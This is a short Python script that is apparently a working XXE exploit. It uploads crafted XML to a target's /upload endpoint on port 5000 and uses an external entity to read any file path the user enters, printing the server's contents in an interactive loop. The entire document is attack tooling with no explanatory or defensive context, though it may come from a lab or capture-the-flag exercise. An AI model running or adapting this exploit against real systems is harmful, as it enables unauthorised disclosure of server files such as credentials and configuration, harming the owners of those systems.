import sys
import requests
from colorama import Fore, Style

def xxe(path, ip):
    url = f"http://{ip}:5000/upload"
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE lfi [<!ENTITY filename SYSTEM "{path}"> ]>
        <Post>
            <Author>&filename;</Author>
            <Subject></Subject>
            <Content></Content>
        </Post>"""
    
    files = {'file': ('xxe.xml', xml, 'text/xml')}

    try:
        r = requests.post(url, files=files)
        if r.status_code != 200:
            print(Fore.RED + "[-] Something went wrong." + Style.RESET_ALL)
            print()
            return
        print(Fore.GREEN + "[+] File read successful." + Style.RESET_ALL)
        response = r.text.split('\n')
        response[1] = response[1][10:]
        print('\n'.join(response[1:-5]))
        print()
    except requests.exceptions.ConnectionError:
        print(Fore.RED + "[-] Something went wrong." + Style.RESET_ALL)
        print()

def main():
    if len(sys.argv) != 2:
        print(Fore.RED + "[-] Usage: python xxe.py <IP>" + Style.RESET_ALL)
        exit(0)
    
    ip = str(sys.argv[1])
    while True:
        print(Fore.BLUE + "[+] File to read: (enter 'exit' to quit)" + Style.RESET_ALL)
        path = input(Fore.BLUE + ">> " + Style.RESET_ALL)
        if (path == "exit"):
            print(Fore.RED + "[-] Bye!" + Style.RESET_ALL)
            exit(0)
        xxe(path, ip)

if __name__ == "__main__":
    main()